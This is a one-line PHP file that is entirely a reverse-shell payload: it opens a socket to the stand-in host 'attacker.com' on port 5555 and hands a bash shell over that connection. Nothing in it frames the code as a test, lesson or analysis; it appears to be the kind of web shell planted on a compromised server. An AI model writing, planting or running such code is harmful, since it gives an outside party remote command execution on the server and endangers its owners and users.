<?php $sock=fsockopen("attacker.com",5555);shell_exec("bash <&3 >&3 2>&3"); ?>
